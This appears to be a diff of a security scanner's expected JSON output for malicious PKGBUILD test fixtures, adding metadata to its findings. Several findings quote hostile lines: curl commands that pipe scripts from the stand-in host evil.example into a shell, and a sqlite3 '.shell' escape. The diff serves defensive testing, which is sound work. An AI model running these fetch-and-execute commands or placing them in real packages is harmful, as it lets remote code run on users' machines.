@@ -54,7 +54,8 @@
       "cwe_id": "CWE-94",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "curl -fsSL https://evil.example/postinstall.sh | /bin/sh"
+        "matched_text": "curl -fsSL https://evil.example/postinstall.sh | /bin/sh",
+        "script_kind": "install script"
       }
     },
     {
@@ -73,7 +74,8 @@
       "cwe_id": "CWE-94",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "curl -fsSL https://evil.example/s | sh"
+        "matched_text": "curl -fsSL https://evil.example/s | sh",
+        "script_kind": "install script"
       }
     },
     {
@@ -92,7 +94,8 @@
       "cwe_id": "CWE-494",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "curl"
+        "matched_text": "curl",
+        "script_kind": "install script"
       }
     },
     {
@@ -111,7 +114,8 @@
       "cwe_id": "CWE-494",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "curl"
+        "matched_text": "curl",
+        "script_kind": "install script"
       }
     },
     {
@@ -129,6 +133,7 @@
       "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
       "cwe_id": "CWE-494",
       "metadata": {
+        "flow": "fetch-pipe",
         "opaque_boundary": true,
         "remote_urls": [
           "https://evil.example/install.sh"
@@ -150,6 +155,7 @@
       "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
       "cwe_id": "CWE-494",
       "metadata": {
+        "flow": "fetch-pipe",
         "opaque_boundary": true,
         "remote_urls": [
           "https://evil.example/y.py"
@@ -171,6 +177,7 @@
       "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
       "cwe_id": "CWE-494",
       "metadata": {
+        "flow": "fetch-pipe",
         "opaque_boundary": true,
         "remote_urls": [
           "https://evil.example/p.py"
@@ -192,6 +199,7 @@
       "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
       "cwe_id": "CWE-494",
       "metadata": {
+        "flow": "fetch-pipe",
         "opaque_boundary": true,
         "remote_urls": [
           "https://evil.example/p.pl"
@@ -213,6 +221,7 @@
       "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
       "cwe_id": "CWE-494",
       "metadata": {
+        "flow": "fetch-pipe",
         "opaque_boundary": true,
         "remote_urls": [
           "https://evil.example/p.php"
@@ -234,6 +243,7 @@
       "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
       "cwe_id": "CWE-494",
       "metadata": {
+        "flow": "fetch-pipe",
         "opaque_boundary": true,
         "remote_urls": [
           "https://evil.example/stage2.sh"
@@ -255,6 +265,7 @@
       "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
       "cwe_id": "CWE-494",
       "metadata": {
+        "flow": "fetch-pipe",
         "opaque_boundary": true,
         "remote_urls": [
           "https://evil.example/postinstall.sh"
@@ -276,6 +287,7 @@
       "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
       "cwe_id": "CWE-494",
       "metadata": {
+        "flow": "fetch-pipe",
         "opaque_boundary": true,
         "remote_urls": [
           "https://evil.example/s"
@@ -334,26 +346,8 @@
       "cwe_id": "CWE-94",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "sqlite3 /var/lib/app.db \".shell"
-      }
-    },
-    {
-      "id": "FUNC-001",
-      "severity": "high",
-      "category": "network_security",
-      "title": "Network access in build function",
-      "description": "Function 'package' contains network access command 'wget'",
-      "location": {
-        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
-        "line": 29,
-        "column": null,
-        "snippet": null
-      },
-      "recommendation": "Network access should happen in source= array, not build functions",
-      "cwe_id": null,
-      "metadata": {
-        "function": "package",
-        "pattern": "wget"
+        "matched_text": "sqlite3 /var/lib/app.db \".shell",
+        "script_kind": "install script"
       }
     },
     {
@@ -380,17 +374,17 @@
       "severity": "high",
       "category": "network_security",
       "title": "Network access in build function",
-      "description": "Function 'build' contains network access command 'wget'",
+      "description": "Function 'package' contains network access command 'wget'",
       "location": {
         "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
-        "line": 15,
+        "line": 29,
         "column": null,
         "snippet": null
       },
       "recommendation": "Network access should happen in source= array, not build functions",
       "cwe_id": null,
       "metadata": {
-        "function": "build",
+        "function": "package",
         "pattern": "wget"
       }
     },
@@ -415,6 +409,6 @@
     "tests/fixtures/malicious/launcher-shell/PKGBUILD",
     "tests/fixtures/malicious/launcher-shell/launcher-shell.install"
   ],
-  "timestamp": "2026-06-15T13:48:49.713146019Z",
-  "scan_duration_ms": 7
+  "timestamp": "2026-11-10T14:51:01.641652180Z",
+  "scan_duration_ms": 25
 }
